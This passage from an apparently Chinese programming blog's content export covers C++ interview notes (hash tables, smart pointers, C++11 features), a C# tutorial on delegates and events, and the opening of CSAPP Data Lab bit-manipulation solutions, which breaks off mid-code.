<p>unordered_map 的实现原理是基于哈希表，通过把关键码值映射到哈希表中一个位置来访问记录。</p>
<p>unordered_map 中的元素没有按照它们的键值或映射值的任何顺序排序，而是根据它们的散列值组织成桶以允许通过它们的键值直接快速访问单个元素（具有常数平均时间复杂度）。</p>
<p>当两个元素具有相同的散列值时，会发生哈希冲突。为了解决这个问题，unordered_map 采用了链地址法，即每个桶中存储一个链表，链表中存放所有散列值相同的元素。</p>
<h1 id="简述哈希冲突的原因、影响因素和解决办法"><a href="#简述哈希冲突的原因、影响因素和解决办法" class="headerlink" title="简述哈希冲突的原因、影响因素和解决办法"></a>简述哈希冲突的原因、影响因素和解决办法</h1><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>哈希是通过对数据进行再压缩，提高效率的一种解决方法。但由于通过哈希函数产生的哈希值是有限的，而数据可能比较多，导致经过哈希函数处理后仍然有不同的数据对应相同的值，这时候就产生了哈希冲突。</p>
<h2 id="影响因素"><a href="#影响因素" class="headerlink" title="影响因素"></a>影响因素</h2><p>装填因子（装填因子 = 数据总数 / 哈希表长）、哈希函数、处理冲突的方法 。</p>
<h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h2><ul>
<li><p><strong>开放地址法：</strong>当发生冲突时，寻找一个新的空闲的哈希地址，如线性探测法、平方探测法等。</p>
</li>
<li><p><strong>链式地址法：</strong>将所有哈希地址相同的数据链接在同一链表中。C++ 的无序容器使用的就是这种方法。</p>
</li>
<li><p><strong>再哈希法：</strong>当发生冲突时，使用另一个哈希函数计算新的哈希地址。</p>
</li>
<li><p><strong>建立公共溢出区：</strong>将所有发生冲突的数据存储在一个单独的区域中。</p>
</li>
</ul>
<h1 id="简述-map-和-unordered-map-的区别"><a href="#简述-map-和-unordered-map-的区别" class="headerlink" title="简述 map 和 unordered_map 的区别"></a>简述 map 和 unordered_map 的区别</h1><p>map 基于红黑树实现，该结构具有自动排序的功能，因此 map 内部的所有元素都是有序的，红黑树的每一个节点都代表着 map 的一个元素。因此，对于 map 进行的查找，删除，添加等一系列的操作都相当于是对红黑树进行这样的操作，故红黑树的效率决定了 map 的效率，其增删查改时间复杂度为 O(log n). </p>
<p>而 unordered_map 内部实现了一个哈希表，因此其元素的排列顺序是杂乱的，无序的。且增删查改时间复杂度为 O(1).</p>
<h1 id="C-智能指针和指针的区别是什么"><a href="#C-智能指针和指针的区别是什么" class="headerlink" title="C++ 智能指针和指针的区别是什么"></a>C++ 智能指针和指针的区别是什么</h1><p>如果在程序中使用 new 关键字从堆（自由存储区）分配内存，等到不需要时，应使用 delete 将其释放。如果未能及时释放，该部分内存在程序运行期间将无法被释放，造成内存泄漏。</p>
<p>为了更方便地进行动态内存分配，C++11 新增了三种智能指针：unique_ptr、shared_ptr 和 weak_ptr. </p>
<p>智能指针实际上是对普通指针的封装，区别是它负责自动释放所指的对象，这样的一层封装机制的目的是为了使得智能指针可以方便地管理一个对象的生命期。指针是一种数据类型，用于保存内存地址；而智能指针是类模板。</p>
<h1 id="weak-ptr-如何解决-shared-ptr-的循环引用问题"><a href="#weak-ptr-如何解决-shared-ptr-的循环引用问题" class="headerlink" title="weak_ptr 如何解决 shared_ptr 的循环引用问题"></a>weak_ptr 如何解决 shared_ptr 的循环引用问题</h1><p>weak_ptr 是为了配合 shared_ptr 而引入的一种智能指针，它指向一个由 shared_ptr 管理的对象而不影响所指对象的生命周期，也就是将一个 weak_ptr 绑定到一个 shared_ptr 不会改变 shared_ptr 的引用计数。</p>
<p>循环引用是指两个或多个 shared_ptr 相互引用，导致它们的引用计数永远不为零，从而无法释放内存。weak_ptr 不会增加 shared_ptr 的引用计数，只是提供了对其所指对象的弱引用，不会影响内存的回收。</p>
<h1 id="shared-ptr-如何得知与它共享对象的指针被释放"><a href="#shared-ptr-如何得知与它共享对象的指针被释放" class="headerlink" title="shared_ptr 如何得知与它共享对象的指针被释放"></a>shared_ptr 如何得知与它共享对象的指针被释放</h1><p>share_ptr 底层是采用引用计数的方式实现的。简单的理解，智能指针在申请堆内存空间的同时，会为其配备一个整型值（初始值为 1），每当有新对象使用此堆内存时，该整型值加 1；反之，每当使用此堆内存的对象被释放时，该整型值减 1。当堆空间对应的整型值为 0 时，即表明不再有对象使用它，该堆空间就会被释放掉。仅当最后一个指针过期时，才调用 delete.</p>
<h1 id="智能指针有没有内存泄漏的情况"><a href="#智能指针有没有内存泄漏的情况" class="headerlink" title="智能指针有没有内存泄漏的情况"></a>智能指针有没有内存泄漏的情况</h1><p>智能指针有内存泄露的情况。如果智能指针之间存在循环引用，就可能导致内存泄漏。循环引用是指两个或多个智能指针互相持有对方的引用，导致引用计数永远不为零，从而无法释放内存。</p>
<p>为了解决循环引用导致的内存泄漏，可以使用弱指针（weak_ptr），它不会修改引用计数的值，也不会对对象的内存进行管理。弱指针可以检测到所管理对象是否已经被销毁，从而避免访问无效的内存地址。</p>
<h1 id="C-11-有哪些新特性"><a href="#C-11-有哪些新特性" class="headerlink" title="C++11 有哪些新特性"></a>C++11 有哪些新特性</h1><p>long long 类型，列表初始化，nullptr 常量，constexpr 常量，auto 类型指示符，类内初始化，基于范围的 for 语句，array 和 forward_list，容器的 emplace 操作，lambda 表达式，无序容器，智能指针，右值引用，虚函数的 override 和 final 运算符…</p>
<h1 id="auto-和-decltype-如何使用"><a href="#auto-和-decltype-如何使用" class="headerlink" title="auto 和 decltype 如何使用"></a>auto 和 decltype 如何使用</h1><p>auto 实现自动类型推断，要求进行显示初始化，让编译器能够将变量的类型设置为初始值的类型。如 <code>auto it = nums.cbegin();</code>.</p>
<p>decltype 将变量的类型声明为表达式指定的类型。如 <code>decltype(f()) sum = x; // sum 的类型就是函数 f 的返回类型</code>.</p>
<h1 id="简述-unique-ptr-的实现原理及使用场景"><a href="#简述-unique-ptr-的实现原理及使用场景" class="headerlink" title="简述 unique_ptr 的实现原理及使用场景"></a>简述 unique_ptr 的实现原理及使用场景</h1><h2 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h2><p>unique_ptr 是 C++11 提供的一种智能指针，它可以防止内存泄漏，实现了独享被管理对象指针的概念。unique_ptr 中把拷贝构造函数和拷贝赋值运算符声明为 private 或 delete，它没有拷贝语义，但是可以通过移动语义进行资源所有权的转移。</p>
<h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><ul>
<li><p>如果程序不需要多个指向同一个对象的指针，则可以使用 unique_ptr；</p>
</li>
<li><p>如果函数使用 new 分配内存，并返回指向该内存的指针，将其返回类型声明为 unique_ptr 是不错的选择。</p>
</li>
</ul>
<h1 id="简述左值、右值、左值引用、右值引用的使用场景"><a href="#简述左值、右值、左值引用、右值引用的使用场景" class="headerlink" title="简述左值、右值、左值引用、右值引用的使用场景"></a>简述左值、右值、左值引用、右值引用的使用场景</h1><ul>
<li>左值是指能够取地址并且有名字的表达式，例如变量或对象。</li>
<li>右值是指不能取地址或者没有名字的表达式，例如字面量（但是字符串字面值是左值）或函数的返回值。</li>
<li>左值引用是一种绑定到左值上的引用，可以通过它来修改或读取左值。左值引用使用 &amp; 符号声明。左值引用可以作为函数的参数，减少拷贝开销，并且允许修改参数。左值引用可以作为类成员变量，表示对另一个对象的别名或关联。</li>
<li>右值引用是一种绑定到右值上的引用，可以通过它来移动或读取右值。右值引用使用 &amp;&amp; 符号声明。右值引用可以作为函数的参数，实现移动语义和完美转发，提高性能和灵活性。</li>
</ul>
<h1 id="简述-C-lambda-表达式用法及实现原理"><a href="#简述-C-lambda-表达式用法及实现原理" class="headerlink" title="简述 C++ lambda 表达式用法及实现原理"></a>简述 C++ lambda 表达式用法及实现原理</h1><p>C++ lambda 表达式是一种可以编写内嵌的匿名函数的技术，用以替换独立函数或者函数对象，并且使代码更可读。</p>
<p>C++ lambda 表达式的基本语法如下：</p>
<p>[ 捕获 ] (形参) -&gt; ret { 函数体 }</p>
<p>其中：</p>
<ul>
<li><p>捕获是指 lambda 表达式可以访问外部作用域中的变量，有不同的方式，如值捕获、引用捕获、隐式捕获等。</p>
</li>
<li><p>形参是指 lambda 表达式可以接受参数，类似于普通函数。</p>
</li>
<li><p>ret 是指 lambda 表达式的返回类型，可以省略，编译器会自动推断。</p>
</li>
<li><p>函数体是指 lambda 表达式要执行的代码块。</p>
</li>
</ul>
<p>C++ lambda 表达式的实现原理是编译器会自动生成一个类似于仿函数的类，并且重载了()运算符，使得该类的对象可以像函数一样调用。捕获列表中的变量会被存储在该类中作为成员变量，并且在构造函数中初始化。</p>
]]></content>
      <categories>
        <category>C++</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>经验</tag>
      </tags>
  </entry>
  <entry>
    <title>CSharp事件和委托</title>
    <url>/2021/05/29/CSharp%E4%BA%8B%E4%BB%B6%E5%92%8C%E5%A7%94%E6%89%98/</url>
    <content><![CDATA[<p>委托与事件在开发中的应用非常广泛，本文将简单介绍C#中委托和事件的定义、使用方法，以及它们之间的区别和联系。</p>
<span id="more"></span>

<h1 id="委托"><a href="#委托" class="headerlink" title="委托"></a>委托</h1><p>C#中的<strong>委托（delegate）</strong>类似于C/C++中的函数指针，是一种存在对某个方法的引用的引用类型变量，所有的委托都派生自<code>System.Delegate</code>类。</p>
<h2 id="委托的声明"><a href="#委托的声明" class="headerlink" title="委托的声明"></a>委托的声明</h2><p>声明委托的语法如下：</p>
<pre class="language-csharp" data-language="csharp"><code class="language-csharp"><span class="token keyword">delegate</span> <span class="token operator">&lt;</span><span class="token keyword">return</span> type<span class="token operator">></span> <span class="token operator">&lt;</span><span class="token keyword">delegate</span> name<span class="token operator">></span> <span class="token operator">&lt;</span>parameter list<span class="token operator">></span></code></pre>

<p>比方说，我要声明一个无返回值，无参数的委托。</p>
<pre class="language-csharp" data-language="csharp"><code class="language-csharp"><span class="token keyword">public</span> <span class="token keyword">delegate</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">MyDelegate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>在声明了委托类型后，必须将其实例化才能生效，可以使用<strong>new</strong>关键字创建并传入参数（参数为一个特定的方法名）。</p>
<pre class="language-csharp" data-language="csharp"><code class="language-csharp"><span class="token class-name">MyDelegate</span> myDelegate <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">MyDelegate</span><span class="token punctuation">(</span>Func1<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>以上实例中我们实例化了一个带有<strong>Func1</strong>方法引用的<strong>MyDelegate</strong>类型变量，并将其赋值给了<strong>myDlegate</strong>实例。</p>
<h2 id="委托的调用"><a href="#委托的调用" class="headerlink" title="委托的调用"></a>委托的调用</h2><p>如果想让委托调用它所引用的方法，可以直接仿照方法调用的写法。</p>
<pre class="language-csharp" data-language="csharp"><code class="language-csharp"><span class="token function">myDelegate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<h2 id="多播委托"><a href="#多播委托" class="headerlink" title="多播委托"></a>多播委托</h2><p>其实一个委托类型的变量可以同时包含多个方法的引用，如果要在委托实例化后对方法引用进行增删操作，可以使用+=或-=运算符。</p>
<p>例如我们要给<strong>myDelegate</strong>添加<strong>Func2</strong>和<strong>Func3</strong>方法并删除对<strong>Func1</strong>方法的引用。</p>
<pre class="language-csharp" data-language="csharp"><code class="language-csharp">myDelegate <span class="token operator">+=</span> Func2<span class="token punctuation">;</span>
myDelegate <span class="token operator">+=</span> Func3<span class="token punctuation">;</span>
myDelegate <span class="token operator">-=</span> Func1<span class="token punctuation">;</span></code></pre>

<h2 id="预定义委托"><a href="#预定义委托" class="headerlink" title="预定义委托"></a>预定义委托</h2><p>在.NET Framework 3.5以来，提供了很多的泛型委托，原先需要手动定义的现在可以直接使用了。</p>
<h3 id="Action委托"><a href="#Action委托" class="headerlink" title="Action委托"></a>Action委托</h3><p><strong>Action</strong>委托代表返回为空的委托，以下示例实例化一个<strong>Action</strong>委托，并引用<strong>Plus</strong>方法。</p>
<pre class="language-csharp" data-language="csharp"><code class="language-csharp"><span class="token keyword">public</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">Plus</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">int</span></span> a<span class="token punctuation">,</span><span class="token class-name"><span class="token keyword">int</span></span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
	Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span>a <span class="token operator">+</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token class-name">Action<span class="token punctuation">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span><span class="token keyword">int</span><span class="token punctuation">></span></span> a <span class="token operator">=</span> Plus<span class="token punctuation">;</span></code></pre>

<p>泛型类型指定为方法的参数类型，最多可指定16个。</p>
<h3 id="Func委托"><a href="#Func委托" class="headerlink" title="Func委托"></a>Func委托</h3><p><strong>Func</strong>委托代表返回值非空的委托，以下实例化一个<strong>Func</strong>委托，并引用<strong>ConnectString</strong>方法。</p>
<pre class="language-csharp" data-language="csharp"><code class="language-csharp"><span class="token keyword">public</span> <span class="token return-type class-name"><span class="token keyword">string</span></span> <span class="token function">ConnectString</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">string</span></span> s1<span class="token punctuation">,</span><span class="token class-name"><span class="token keyword">string</span></span> s2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> s1 <span class="token operator">+</span> s2<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token class-name">Func<span class="token punctuation">&lt;</span><span class="token keyword">string</span><span class="token punctuation">,</span><span class="token keyword">string</span><span class="token punctuation">,</span><span class="token keyword">string</span><span class="token punctuation">></span></span> f <span class="token operator">=</span> ConnectString<span class="token punctuation">;</span></code></pre>

<p>最后一位泛型类型指定方法的返回值类型，前面各类型指定方法参数类型，同样最多指定16个。</p>
<h1 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h1><p><strong>事件（Event）</strong>可以理解为一种封装好的委托，用于程序对用户的某些操作进行响应。事件在类内声明，通过使用同一个类或其他类中的委托与事件处理程序相关联。</p>
<h2 id="通过委托创建事件"><a href="#通过委托创建事件" class="headerlink" title="通过委托创建事件"></a>通过委托创建事件</h2><h3 id="事件的声明"><a href="#事件的声明" class="headerlink" title="事件的声明"></a>事件的声明</h3><p>事件声明方法与实例化委托很类似，不同之处在于需要在委托类型前加上<strong>event</strong>关键字。</p>
<pre class="language-csharp" data-language="csharp"><code class="language-csharp"><span class="token keyword">public</span> <span class="token keyword">delegate</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">MyDelegate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">public</span> <span class="token keyword">event</span> <span class="token class-name">MyDelegate</span> myEvent<span class="token punctuation">;</span></code></pre>

<h3 id="与委托变量的区别"><a href="#与委托变量的区别" class="headerlink" title="与委托变量的区别"></a>与委托变量的区别</h3><ol>
<li><p>事件只能作为类的成员变量</p>
<pre class="language-csharp" data-language="csharp"><code class="language-csharp"><span class="token keyword">class</span> <span class="token class-name">DelegateClass</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">delegate</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">MyDelegate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">event</span> <span class="token class-name">MyDelegate</span> myEvent1<span class="token punctuation">;</span> <span class="token comment">//编译通过</span>
    <span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> args<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">event</span> <span class="token class-name">MyDelegate</span> myEvent2<span class="token punctuation">;</span> <span class="token comment">//编译出错</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre></li>
<li><p>事件只能在类内调用</p>
<pre class="language-csharp" data-language="csharp"><code class="language-csharp"><span class="token keyword">public</span> <span class="token keyword">delegate</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">MyDelegate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name">DelegateClass</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">event</span> <span class="token class-name">MyDelegate</span> myEvent<span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">EventFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">myEvent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//编译通过</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> args<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token class-name">DelegateClass</span> delegateClass <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">DelegateClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        delegateClass<span class="token punctuation">.</span><span class="token function">myEvent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//编译出错</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre></li>
</ol>
<h2 id="发布-订阅模式"><a href="#发布-订阅模式" class="headerlink" title="发布-订阅模式"></a>发布-订阅模式</h2><p>事件使用<strong>发布-订阅（publisher-subscriber）模型</strong>，在这个模型中，<strong>发布器（publisher）</strong>为包含事件的类，<strong>订阅器（subscriber）</strong>为接收事件的类，<strong>调度中心（Topic）</strong>为事件。</p>
<p>以下通过一个简单的案例来更好的理解这种模式。</p>
<pre class="language-csharp" data-language="csharp"><code class="language-csharp"><span class="token keyword">using</span> <span class="token namespace">System</span><span class="token punctuation">;</span>
<span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Collections<span class="token punctuation">.</span>Generic</span><span class="token punctuation">;</span>
<span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Text</span><span class="token punctuation">;</span>

<span class="token keyword">namespace</span> CSharp事件
<span class="token punctuation">&#123;</span>
    <span class="token comment">//发布器</span>
    <span class="token keyword">class</span> <span class="token class-name">Publisher</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">private</span> <span class="token class-name"><span class="token keyword">int</span></span> <span class="token keyword">value</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token function">Publisher</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">int</span></span> v<span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">value</span> <span class="token operator">=</span> v<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token comment">//声明委托以及事件</span>
        <span class="token keyword">public</span> <span class="token keyword">delegate</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">MyDelegate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token keyword">event</span> <span class="token class-name">MyDelegate</span> changeValue<span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">SetValue</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">int</span></span> v<span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token class-name"><span class="token keyword">int</span></span> formerValue <span class="token operator">=</span> <span class="token keyword">value</span><span class="token punctuation">;</span>
            <span class="token keyword">value</span> <span class="token operator">=</span> v<span class="token punctuation">;</span>
            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"Set is complete!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">//当value值改变时，调用事件</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>changeValue <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> formerValue <span class="token operator">!=</span> <span class="token keyword">value</span><span class="token punctuation">)</span>
                <span class="token function">changeValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">//订阅器</span>
    <span class="token keyword">class</span> <span class="token class-name">Subscriber</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">public</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">Print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"The value has been changed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">class</span> <span class="token class-name">MainClass</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> args<span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token comment">//实例化订阅器并赋value为3</span>
            <span class="token class-name">Publisher</span> publisher <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">Publisher</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Subscriber</span> subscriber <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">Subscriber</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">//将订阅器中的方法Print注册到发布器的事件中</span>
            publisher<span class="token punctuation">.</span>changeValue <span class="token operator">+=</span> subscriber<span class="token punctuation">.</span>Print<span class="token punctuation">;</span>
            <span class="token comment">//从控制台接受一个整数</span>
            <span class="token class-name"><span class="token keyword">int</span></span> v <span class="token operator">=</span> Convert<span class="token punctuation">.</span><span class="token function">ToInt32</span><span class="token punctuation">(</span>Console<span class="token punctuation">.</span><span class="token function">ReadLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">//设置订阅器对象的value值</span>
            publisher<span class="token punctuation">.</span><span class="token function">SetValue</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
</code></pre>

<p>当输入的值为3（与初始化value值相同），输出结果如下：</p>
<p><img src="/2021/05/29/CSharp%E4%BA%8B%E4%BB%B6%E5%92%8C%E5%A7%94%E6%89%98/same.png"></p>
<p>当输入值为5（与初始化value值不同），输出结果如下：</p>
<p><img src="/2021/05/29/CSharp%E4%BA%8B%E4%BB%B6%E5%92%8C%E5%A7%94%E6%89%98/different.png"></p>
]]></content>
      <categories>
        <category>CSharp</category>
      </categories>
      <tags>
        <tag>.NET</tag>
        <tag>CSharp</tag>
        <tag>事件</tag>
        <tag>委托</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP Data Lab</title>
    <url>/2024/08/31/CSAPP-Data-Lab/</url>
    <content><![CDATA[<p>CSAPP 的第一个 Lab，对应知识点为书中的第 2 章（信息的表示与处理），要求使用受限制的运算符和表达式实现一些位操作。主要分为两个部分：整数部分和浮点数部分。其中整数部分限制较多，比较偏重技巧性，部分题个人认为很有难度。而浮点数部分则比较基础，主要考察对 IEEE 754 标准的熟悉程度，代码较长，但思路相对简单。</p>
<span id="more"></span>

<h1 id="bitXor"><a href="#bitXor" class="headerlink" title="bitXor"></a>bitXor</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>使用德-摩根定律进行推导，推导过程如下：</p>
<p><img src="/2024/08/31/CSAPP-Data-Lab/formu.png"></p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">bitXor</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 德-摩根定律</span>
    <span class="token keyword">return</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span>x <span class="token operator">&amp;</span> <span class="token operator">~</span>y<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token operator">~</span>x <span class="token operator">&amp;</span> y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>最小整数即最高位（负数权重）为 1，其余（正数权重）为 0。</p>
<h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">tmin</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">31</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="isTmax"><a href="#isTmax" class="headerlink" title="isTmax"></a>isTmax</h1><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>由于不能使用左移运算符，因此没办法直接构造出 tmax，需要仔细考虑 tmax 的性质：<code>tmax = 0x7fffffff</code> ，而 <code>tmax + 1 = 0x80000000</code> ，这两个数的二进制位完全互补，因此满足：<code>tmax + tmax + 1 = 0xffffffff</code>，结果全为 1，对该结果取反即可得到 0，取非得到 1。</p>
<p>但这里还要考虑一个特殊情况：当 <code>x = 0xffffffff</code> 时，<code>x + 1 + x</code> 也满足等于 <code>0xffffffff</code>，因此需要借助异或运算进行特判。</p>
<h2 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">isTmax</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> case1 <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// case = x == 0xffffffff ? 1 : 0;</span>
    <span class="token keyword">return</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">+</span> x<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">!</span>case1<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="allOddBits"><a href="#allOddBits" class="headerlink" title="allOddBits"></a>allOddBits</h1><h2 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h2><p>首先构造一个掩码 mask，奇数位全为 1，偶数位全为 0。将 mask 与 x 进行按位与，如果 x 的奇数位全为 1，那么按位与的结果仍然为 mask。然后便可以借助异或和非的组合，将结果转换为 0 或 1。</p>
<h2 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">allOddBits</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> mask <span class="token operator">=</span> <span class="token number">0xaa</span><span class="token punctuation">;</span>            <span class="token comment">// mask = 0x000000aa</span>
    mask <span class="token operator">=</span> <span class="token punctuation">(</span>mask <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0xaa</span><span class="token punctuation">;</span>  <span class="token comment">// mask = 0x0000aaaa</span>
    mask <span class="token operator">=</span> <span class="token punctuation">(</span>mask <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0xaa</span><span class="token punctuation">;</span>  <span class="token comment">// mask = 0x00aaaaaa</span>
